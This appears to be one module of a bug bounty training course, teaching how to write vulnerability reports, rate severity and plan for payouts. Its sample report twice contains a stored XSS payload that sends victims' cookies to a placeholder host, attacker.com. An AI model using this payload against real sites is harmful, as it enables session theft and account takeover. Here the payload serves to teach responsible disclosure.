# 📝 Module 17: Documenting & Reporting

> **Level:** 💰 Earn | **Time:** ~3 hours | **Prerequisites:** All previous modules

---

## 📖 Overview

A well-written bug report is as important as finding the bug itself. Poor reports get rejected, triaged as informational, or awarded minimal bounties. Professional reports that clearly demonstrate impact, provide reliable reproduction steps, and suggest fixes get paid quickly and at higher amounts.

---

## ❓ Why It Matters

Researchers regularly lose hundreds or thousands of dollars by submitting poorly written reports. Some bugs are closed as "not enough information" or "can't reproduce" simply because the report lacked detail. A **$5,000 bug** can become a **$500 bug** (or no bounty) with a bad report.

---

## 🌍 Real-World Example

Two researchers found the same XSS vulnerability within days of each other. Researcher A submitted a one-liner: "XSS in search field." Researcher B submitted a detailed report with screenshots, impact analysis, and exploitation PoC. Researcher A's report was closed as duplicate; Researcher B earned $3,000 and got credited in the Hall of Fame.

---

## 📋 Professional Bug Report Template

```markdown
## Vulnerability Title
[Clear, specific title: e.g., "Stored XSS in Profile Bio Field Leads to Account Takeover"]

## Severity
[Critical / High / Medium / Low / Informational]
CVSS Score: X.X

## Affected Asset
[URL/endpoint/component: e.g., https://app.target.com/profile/edit]

## Vulnerability Type
[e.g., Cross-Site Scripting (XSS) - Stored]

## Description
[Clear, concise description of the vulnerability. What it is, where it is, 
and why it's a problem. 2-4 sentences.]

## Impact
[What can an attacker do with this? Be specific and realistic.
- Account takeover via session cookie theft
- Arbitrary code execution as victim user
- Data exfiltration from victim's account]

## Steps to Reproduce
1. Log in as attacker at https://app.target.com/login
2. Navigate to profile settings: https://app.target.com/profile/edit
3. In the "Bio" field, insert the following payload:
   ```
   <img src=x onerror=document.location='https://attacker.com/'+document.cookie>
   ```
4. Click "Save Profile"
5. Log out and log in as a different test user
6. Navigate to the attacker's profile: https://app.target.com/profile/attacker
7. Observe that the victim's cookies are sent to attacker.com

## Proof of Concept

### Request
```http
POST /api/profile/update HTTP/1.1
Host: app.target.com
Cookie: session=attacker_session_token
Content-Type: application/json

{"bio": "<img src=x onerror=document.location='https://attacker.com/'+document.cookie>"}
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "updated", "bio": "<img src=x onerror=...>"}
```

### Screenshots
[Include annotated screenshots showing:]
1. Payload being inserted
2. Vulnerable profile page rendering the payload  
3. Attacker receiving the stolen cookie

## Root Cause
[Optional but helpful: Why does this vulnerability exist?
The bio field is not sanitized before being stored or rendered.
The Content-Security-Policy header is missing.]

## Remediation
1. Sanitize user input before storage using a library like DOMPurify
2. Implement Content-Security-Policy: script-src 'self'
3. Set HttpOnly flag on session cookies to prevent XSS-based theft
4. Encode user-supplied content before rendering in HTML context

## References
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: Improper Neutralization of Input During Web Page Generation
```

---

## 🎯 Report Quality Checklist

### Before Submitting

```
□ Title clearly describes the vulnerability and impact
□ Severity is appropriate (not over or under-rated)
□ Affected URL/endpoint is clearly specified
□ Steps to reproduce are complete and accurate
□ Steps can be followed by someone unfamiliar with the bug
□ Proof of concept demonstrates real impact
□ Screenshots are included and annotated
□ HTTP requests/responses are included
□ Impact statement is specific (not just "security risk")
□ Remediation suggestions are included
□ Tested in a separate browser/account to verify
□ Bug is in scope for the program
□ Bug is not a known duplicate (check similar reports)
```

### Severity Determination

```
CRITICAL (9.0-10.0):
- Remote code execution
- Authentication bypass to admin
- Mass account takeover
- Mass data breach
- SQL injection with full DB access

HIGH (7.0-8.9):
- Stored XSS affecting many users
- IDOR exposing sensitive personal data
- SSRF to internal network
- Significant privilege escalation

MEDIUM (4.0-6.9):
- Reflected XSS (requires user interaction)
- CSRF on sensitive actions
- Open redirect
- Information disclosure of non-critical data
- Missing rate limiting on sensitive endpoints

LOW (0.1-3.9):
- Self-XSS
- Minor information disclosure
- Missing security headers
- Non-sensitive open redirect

Informational:
- Best practice recommendations
- Very minor issues
```

---

## 💰 Earning Strategies

### Choosing Programs Strategically

```
Criteria for high-value programs:
1. High maximum bounty amounts
2. Broad scope (more attack surface)
3. Active program (recent bounties paid)
4. Fast response time
5. Fair duplicate policy

Best programs for beginners:
- Programs with "no duplicates in scope" protection
- Programs explicitly welcoming newcomers
- Programs with broad web app scope
- VDP programs for practice without pressure
```

### Avoiding Duplicates

```
Before testing:
1. Read ALL disclosed/public reports for the program
2. Check Hacktivity for similar findings
3. Search for your bug type in the specific endpoint
4. Test quickly after finding something (file fast!)

When you find something:
1. Don't spend days polishing if it's time-sensitive
2. File a draft immediately to claim your finding
3. Improve the report before full submission
```

### Maximizing Payouts

```
1. Chain vulnerabilities for higher impact
   XSS + missing HttpOnly cookie = Account Takeover
   SSRF + metadata access = Cloud credential theft
   IDOR + sensitive data = Privacy violation

2. Demonstrate real-world impact
   - Show the data that can be accessed
   - Demonstrate actual account compromise
   - Quantify the potential affected users

3. Be professional and collaborative
   - Respond quickly to triager questions
   - Be willing to provide additional PoC
   - Accept reasonable severity adjustments
   - Build relationship with program security teams
```

### First Payout Strategy

```
Month 1: Setup & Learning
   - Complete Modules 1-10
   - Practice all techniques on DVWA/PortSwigger
   - Read 50+ disclosed bug reports

Month 2: Hunting Begins
   - Choose 3-5 programs with broad scope
   - Focus on recon and attack surface mapping
   - Submit first bugs (even low severity for practice)

Month 3: First Payout
   - Target specific vulnerability types you know well
   - Focus on areas others overlook (mobile APIs, old subdomains)
   - Submit your best-documented bugs
   
Success metrics:
   - 10+ bugs submitted = you're learning
   - 1 valid bug = you understand the process
   - First payout = you're a bug bounty hunter!
```

---

## 📊 Tracking Your Work

### Spreadsheet Template

```
Columns:
| Date | Program | Asset | Vuln Type | Severity | Status | Bounty | Notes |

Status values:
- Testing
- Submitted
- Triaging
- Duplicate
- Not Applicable
- Resolved
- Paid

Track metrics:
- Total bugs submitted
- Acceptance rate
- Average severity
- Monthly earnings
- Most successful bug types
```

---

## 🧪 Practice Labs

| Resource | Purpose |
|----------|---------|
| HackerOne Hacker101 | Learn proper report writing |
| Read disclosed reports | Study what makes good reports |
| Bug Bounty Forum | Community feedback on reports |
| Your own test apps | Practice writing reports on DVWA findings |

---

## 📚 Additional Reading

- [Report Writing Guide](./report-template.md) — Full template with examples
- [Earnings Guide](./earnings-guide.md) — Detailed bounty strategy

---

<div align="center">

[← Module 16: Automating VAPT](../16.%20Automating%20VAPT/README.md) | [Next Module: Conclusion →](../18.%20Conclusion/README.md)

</div>
